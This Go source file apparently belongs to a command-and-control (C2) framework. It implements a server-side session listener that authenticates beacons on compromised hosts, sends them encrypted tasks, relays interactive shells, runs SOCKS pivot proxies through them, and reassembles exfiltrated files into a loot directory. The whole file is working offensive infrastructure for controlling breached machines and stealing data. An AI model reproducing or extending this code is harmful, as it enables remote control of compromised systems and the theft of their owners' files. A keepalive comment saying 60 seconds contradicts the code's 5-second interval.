package server

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"sync"
	"time"

	"c2/models"
	"c2/protocol"
	"c2/store"
	"c2/ui"
)

// SessionListener accepts persistent TCP connections from beacons that have
// been upgraded to session mode via TASK_INTERACTIVE.
type SessionListener struct {
	Port     int
	store    *store.Store
	listener net.Listener
	saver    saver
	hub      *Hub

	subMu       sync.RWMutex
	subscribers map[uint32][]chan []byte

	shellMgr *ShellManager
	socksMgr *SocksManager
}

// NewSessionListener creates a new TCP session listener.
func NewSessionListener(port int, s *store.Store, p saver, hub *Hub, socksMgr *SocksManager) *SessionListener {
	return &SessionListener{
		Port:        port,
		store:       s,
		saver:       p,
		hub:         hub,
		subscribers: make(map[uint32][]chan []byte),
		shellMgr:    NewShellManager(),
		socksMgr:    socksMgr,
	}
}

// Start binds the TCP listener and begins accepting connections.
func (sl *SessionListener) Start() error {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", sl.Port))
	if err != nil {
		return fmt.Errorf("session listener: %w", err)
	}
	sl.listener = ln
	go sl.acceptLoop()
	return nil
}

// Shutdown closes the TCP listener, stopping new connections.
func (sl *SessionListener) Shutdown() {
	if sl.listener != nil {
		sl.listener.Close()
	}
}

func (sl *SessionListener) acceptLoop() {
	for {
		conn, err := sl.listener.Accept()
		if err != nil {
			return // listener closed
		}
		go sl.handleSession(conn)
	}
}

func (sl *SessionListener) handleSession(conn net.Conn) {
	defer conn.Close()

	// --- handshake: 4-byte plaintext beacon ID ---
	idBuf := make([]byte, 4)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Read(idBuf); err != nil {
		return
	}
	conn.SetReadDeadline(time.Time{})

	beaconID := binary.LittleEndian.Uint32(idBuf)
	beacon := sl.store.GetBeacon(beaconID)
	if beacon == nil {
		return
	}

	// --- read connection type byte ---
	typeBuf := make([]byte, 1)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Read(typeBuf); err != nil {
		return
	}
	conn.SetReadDeadline(time.Time{})

	if typeBuf[0] == protocol.ConnShell {
		sl.handleShellConnection(conn, beaconID)
		return
	}

	if typeBuf[0] == protocol.ConnSocks {
		sl.handleSocksConnection(conn, beaconID)
		return
	}

	// --- encrypted confirmation: beacon ID again, encrypted with session key ---
	envData, err := ReadEnvelope(conn)
	if err != nil {
		return
	}
	plain, err := protocol.Decrypt(beacon.SessionKey, envData)
	if err != nil {
		return
	}
	if len(plain) < 4 || binary.LittleEndian.Uint32(plain[:4]) != beaconID {
		return
	}

	// --- session established ---
	sl.store.RegisterSession(beaconID, conn)
	sl.store.UpdateLastSeen(beaconID)
	sl.hub.Publish("sessions", "update", map[string]interface{}{"id": beaconID, "mode": "session"})
	sl.hub.Publish("sessions", "checkin", map[string]interface{}{"id": beaconID})
	ui.Success("session", fmt.Sprintf("%q (%d) connected", beacon.Hostname, beaconID))

	evt := &models.Event{
		Type:      "session",
		Message:   fmt.Sprintf("session opened: %s (%d)", beacon.Hostname, beaconID),
		Timestamp: time.Now(),
	}
	sl.store.AddEvent(evt)
	sl.saver.SaveEvents(sl.store.ListEvents())
	sl.hub.Publish("events", "add", evt)

	done := make(chan struct{})
	go sl.keepalive(beaconID, beacon.SessionKey, conn, done)

	// --- read loop: receive results from beacon ---
	for {
		envData, err := ReadEnvelope(conn)
		if err != nil {
			break
		}
		plain, err := protocol.Decrypt(beacon.SessionKey, envData)
		if err != nil {
			continue
		}
		if len(plain) < 16 {
			continue
		}
		hdr, err := protocol.DecodeHeader(plain[:16])
		if err != nil {
			continue
		}
		sl.store.UpdateLastSeen(beaconID)

		if hdr.Type != protocol.TaskNOP {
			sl.hub.Publish("sessions", "checkin", map[string]interface{}{"id": beaconID})
		}

		switch hdr.Type {
		case protocol.TaskNOP:
			continue

		case protocol.TaskShellOutput:
			output, err := protocol.DecodeRunRep(plain[16:])
			if err != nil {
				continue
			}
			sl.shellMgr.Send(beaconID, []byte(output))

		case protocol.TaskFileExfil:
			done, filename, assembled := sl.store.AddExfilFragment(hdr.Label, hdr.Identifier, hdr.Flags, plain[16:])
			if done {
				if filename != "" {
					if err := sl.saveExfilFile(hdr.Label, filename, assembled); err != nil {
						ui.Errorf("exfil", "save label=%d: %v", hdr.Label, err)
					} else {
						sl.store.MarkExfilDone(hdr.Label, filename, beaconID, int64(len(assembled)))
						sl.hub.Publish("loot", "add", map[string]interface{}{
							"label": hdr.Label, "filename": filename, "beacon_id": beaconID,
							"size": int64(len(assembled)), "exfil_at": time.Now().Unix(),
						})
						evt := &models.Event{
							Type:      "exfil",
							Message:   fmt.Sprintf("file exfiltrated from #%d: %s (%d bytes)", beaconID, filename, len(assembled)),
							Timestamp: time.Now(),
						}
						sl.store.AddEvent(evt)
						sl.saver.SaveEvents(sl.store.ListEvents())
						sl.hub.Publish("events", "add", evt)
					}
				}
				result := &models.Result{
					Label:      hdr.Label,
					BeaconID:   beaconID,
					Type:       protocol.TaskFileExfil,
					Filename:   filename,
					ReceivedAt: time.Now(),
				}
				sl.store.StoreResult(result)
				sl.store.MarkTaskDone(hdr.Label)
				sl.hub.Publish("results", "add", map[string]interface{}{
					"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskFileExfil,
					"filename": filename, "output": "", "received_at": time.Now().Unix(),
				})
			}

		case protocol.TaskFileStage:
			output, _ := protocol.DecodeRunRep(plain[16:])
			evt := &models.Event{
				Type:      "upload",
				Message:   fmt.Sprintf("file staged on #%d: %s", beaconID, output),
				Timestamp: time.Now(),
			}
			sl.store.AddEvent(evt)
			sl.saver.SaveEvents(sl.store.ListEvents())
			sl.hub.Publish("events", "add", evt)
			result := &models.Result{
				Label:      hdr.Label,
				BeaconID:   beaconID,
				Type:       protocol.TaskFileStage,
				Flags:      hdr.Flags,
				Output:     output,
				ReceivedAt: time.Now(),
			}
			sl.store.StoreResult(result)
			sl.store.MarkTaskDone(hdr.Label)
			sl.hub.Publish("results", "add", map[string]interface{}{
				"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskFileStage,
				"flags": hdr.Flags, "output": output, "received_at": time.Now().Unix(),
			})

		case protocol.TaskSet:
			output, _ := protocol.DecodeRunRep(plain[16:])
			result := &models.Result{
				Label:      hdr.Label,
				BeaconID:   beaconID,
				Type:       protocol.TaskSet,
				Output:     output,
				ReceivedAt: time.Now(),
			}
			sl.store.StoreResult(result)
			sl.store.MarkTaskDone(hdr.Label)
			sl.hub.Publish("results", "add", map[string]interface{}{
				"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskSet,
				"output": output, "received_at": time.Now().Unix(),
			})

		default:
			output, err := protocol.DecodeRunRep(plain[16:])
			if err != nil {
				continue
			}
			result := &models.Result{
				BeaconID:   beaconID,
				Label:      hdr.Label,
				Flags:      hdr.Flags,
				Output:     output,
				ReceivedAt: time.Now(),
			}
			sl.store.StoreResult(result)
			sl.store.MarkTaskDone(hdr.Label)
			sl.hub.Publish("results", "add", map[string]interface{}{
				"label": result.Label, "beacon_id": beaconID, "flags": hdr.Flags,
				"output": result.Output, "received_at": result.ReceivedAt.Unix(),
			})
			sl.notifySubscribers(beaconID, result)
		}
	}

	// --- session closed ---
	close(done)
	sl.store.RemoveSession(beaconID)
	sl.shellMgr.Close(beaconID)
	if sl.socksMgr != nil {
		sl.socksMgr.StopProxy(beaconID)
	}
	sl.hub.Publish("sessions", "update", map[string]interface{}{"id": beaconID, "mode": "beacon"})
	ui.Error("session", fmt.Sprintf("%q (%d) disconnected", beacon.Hostname, beaconID))

	evt = &models.Event{
		Type:      "session",
		Message:   fmt.Sprintf("session closed: %s (%d)", beacon.Hostname, beaconID),
		Timestamp: time.Now(),
	}
	sl.store.AddEvent(evt)
	sl.saver.SaveEvents(sl.store.ListEvents())
	sl.hub.Publish("events", "add", evt)
}

// keepalive sends an encrypted NOP every 60 seconds to keep the TCP session
// alive. Stops when the done channel is closed.
func (sl *SessionListener) keepalive(beaconID uint32, key []byte, conn net.Conn, done chan struct{}) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			nop := protocol.NewNOP()
			taskBytes := protocol.EncodeHeader(nop.Header)
			encrypted, err := protocol.Encrypt(key, taskBytes)
			if err != nil {
				return
			}
			if err := WriteEnvelope(conn, encrypted); err != nil {
				return
			}
		}
	}
}

// SendTask encrypts and sends a serialized task to the beacon's active
// TCP session.
func (sl *SessionListener) SendTask(beaconID uint32, taskBytes []byte) error {
	session := sl.store.GetSession(beaconID)
	if session == nil {
		return fmt.Errorf("no active session for beacon %d", beaconID)
	}
	beacon := sl.store.GetBeacon(beaconID)
	if beacon == nil {
		return fmt.Errorf("unknown beacon %d", beaconID)
	}
	encrypted, err := protocol.Encrypt(beacon.SessionKey, taskBytes)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}
	return WriteEnvelope(session.Conn, encrypted)
}

// Subscribe registers a channel to receive result notifications for a beacon.
func (sl *SessionListener) Subscribe(beaconID uint32, ch chan []byte) {
	sl.subMu.Lock()
	defer sl.subMu.Unlock()
	sl.subscribers[beaconID] = append(sl.subscribers[beaconID], ch)
}

// Unsubscribe removes a previously registered channel.
func (sl *SessionListener) Unsubscribe(beaconID uint32, ch chan []byte) {
	sl.subMu.Lock()
	defer sl.subMu.Unlock()
	subs := sl.subscribers[beaconID]
	for i, s := range subs {
		if s == ch {
			sl.subscribers[beaconID] = append(subs[:i], subs[i+1:]...)
			break
		}
	}
}

func (sl *SessionListener) notifySubscribers(beaconID uint32, result *models.Result) {
	sl.subMu.RLock()
	defer sl.subMu.RUnlock()
	msg := fmt.Sprintf(`{"label":%d,"output":%q,"timestamp":%d}`,
		result.Label, result.Output, result.ReceivedAt.Unix())
	for _, ch := range sl.subscribers[beaconID] {
		select {
		case ch <- []byte(msg):
		default: // drop if subscriber is slow
		}
	}
}

// handleShellConnection handles a shell-only TCP connection from a beacon.
func (sl *SessionListener) handleShellConnection(conn net.Conn, beaconID uint32) {
	beacon := sl.store.GetBeacon(beaconID)
	if beacon == nil {
		return
	}

	// --- encrypted confirmation: beacon ID again, encrypted with session key ---
	envData, err := ReadEnvelope(conn)
	if err != nil {
		return
	}
	plain, err := protocol.Decrypt(beacon.SessionKey, envData)
	if err != nil {
		return
	}
	if len(plain) < 4 || binary.LittleEndian.Uint32(plain[:4]) != beaconID {
		return
	}

	// --- shell connection established ---
	sl.store.RegisterShell(beaconID, conn)
	defer sl.store.RemoveShell(beaconID)
	defer conn.Close()

	ui.Success("shell", fmt.Sprintf("%q (%d) shell connected", beacon.Hostname, beaconID))

	evt := &models.Event{
		Type:      "shell",
		Message:   fmt.Sprintf("shell tcp opened: %s (%d)", beacon.Hostname, beaconID),
		Timestamp: time.Now(),
	}
	sl.store.AddEvent(evt)
	sl.saver.SaveEvents(sl.store.ListEvents())
	sl.hub.Publish("events", "add", evt)
	sl.hub.Publish("sessions", "update", map[string]interface{}{"id": beaconID, "shell_active": true})

	// --- read loop: receive shell output from beacon ---
	for {
		envData, err := ReadEnvelope(conn)
		if err != nil {
			break
		}
		plain, err := protocol.Decrypt(beacon.SessionKey, envData)
		if err != nil {
			continue
		}
		if len(plain) < 16 {
			continue
		}
		hdr, err := protocol.DecodeHeader(plain[:16])
		if err != nil {
			continue
		}

		if hdr.Type == protocol.TaskShellOutput {
			output, err := protocol.DecodeRunRep(plain[16:])
			if err != nil {
				continue
			}
			sl.shellMgr.Send(beaconID, []byte(output))
		}
	}

	// --- shell connection closed ---
	sl.shellMgr.Close(beaconID)
	ui.Error("shell", fmt.Sprintf("%q (%d) shell disconnected", beacon.Hostname, beaconID))

	evt = &models.Event{
		Type:      "shell",
		Message:   fmt.Sprintf("shell tcp closed: %s (%d)", beacon.Hostname, beaconID),
		Timestamp: time.Now(),
	}
	sl.store.AddEvent(evt)
	sl.saver.SaveEvents(sl.store.ListEvents())
	sl.hub.Publish("events", "add", evt)
	sl.hub.Publish("sessions", "update", map[string]interface{}{"id": beaconID, "shell_active": false})
}

// handleSocksConnection handles the SOCKS relay TCP connection from a beacon.
func (sl *SessionListener) handleSocksConnection(conn net.Conn, beaconID uint32) {
	beacon := sl.store.GetBeacon(beaconID)
	if beacon == nil {
		return
	}

	// --- encrypted confirmation: beacon ID again, encrypted with session key ---
	envData, err := ReadEnvelope(conn)
	if err != nil {
		return
	}
	plain, err := protocol.Decrypt(beacon.SessionKey, envData)
	if err != nil {
		return
	}
	if len(plain) < 4 || binary.LittleEndian.Uint32(plain[:4]) != beaconID {
		return
	}

	// --- SOCKS connection established ---
	if sl.socksMgr != nil {
		sl.socksMgr.SetSocksConn(beaconID, conn)
	}
	defer conn.Close()

	ui.Success("socks", fmt.Sprintf("%q (%d) socks relay connected", beacon.Hostname, beaconID))

	evt := &models.Event{
		Type:      "socks",
		Message:   fmt.Sprintf("socks relay opened: %s (%d)", beacon.Hostname, beaconID),
		Timestamp: time.Now(),
	}
	sl.store.AddEvent(evt)
	sl.saver.SaveEvents(sl.store.ListEvents())
	sl.hub.Publish("events", "add", evt)

	// --- read loop: receive SOCKS channel messages from beacon ---
	for {
		envData, err := ReadEnvelope(conn)
		if err != nil {
			break
		}
		plain, err := protocol.Decrypt(beacon.SessionKey, envData)
		if err != nil {
			continue
		}
		if len(plain) < 16 {
			continue
		}
		hdr, err := protocol.DecodeHeader(plain[:16])
		if err != nil {
			continue
		}

		switch hdr.Type {
		case protocol.TaskSocksAck:
			if sl.socksMgr != nil {
				sl.socksMgr.DeliverAck(beaconID, hdr.Label, hdr.Code)
			}

		case protocol.TaskSocksData:
			if sl.socksMgr != nil {
				sl.socksMgr.DeliverData(beaconID, hdr.Label, plain[16:])
			}

		case protocol.TaskSocksClose:
			if sl.socksMgr != nil {
				sl.socksMgr.DeliverClose(beaconID, hdr.Label)
			}
		}
	}

	// --- SOCKS connection closed ---
	if sl.socksMgr != nil {
		sl.socksMgr.StopProxy(beaconID)
	}
	ui.Error("socks", fmt.Sprintf("%q (%d) socks relay disconnected", beacon.Hostname, beaconID))

	evt = &models.Event{
		Type:      "socks",
		Message:   fmt.Sprintf("socks relay closed: %s (%d)", beacon.Hostname, beaconID),
		Timestamp: time.Now(),
	}
	sl.store.AddEvent(evt)
	sl.saver.SaveEvents(sl.store.ListEvents())
	sl.hub.Publish("events", "add", evt)
}

func (sl *SessionListener) saveExfilFile(label uint32, filename string, data []byte) error {
	if err := os.MkdirAll("exfil", 0755); err != nil {
		return err
	}
	path := filepath.Join("exfil", fmt.Sprintf("%d_%s", label, filepath.Base(filename)))
	return os.WriteFile(path, data, 0644)
}

// CloseSession closes the TCP session for a beacon without killing the beacon.
func (sl *SessionListener) CloseSession(beaconID uint32) {
	session := sl.store.GetSession(beaconID)
	if session != nil {
		session.Conn.Close()
	}
}

// SendShellTask encrypts and sends a task to the beacon's shell TCP connection.
func (sl *SessionListener) SendShellTask(beaconID uint32, taskBytes []byte) error {
	conn := sl.store.GetShellConn(beaconID)
	if conn == nil {
		return fmt.Errorf("no active shell connection for beacon %d", beaconID)
	}
	beacon := sl.store.GetBeacon(beaconID)
	if beacon == nil {
		return fmt.Errorf("unknown beacon %d", beaconID)
	}
	encrypted, err := protocol.Encrypt(beacon.SessionKey, taskBytes)
	if err != nil {
		return fmt.Errorf("encrypt: %w", err)
	}
	return WriteEnvelope(conn, encrypted)
}
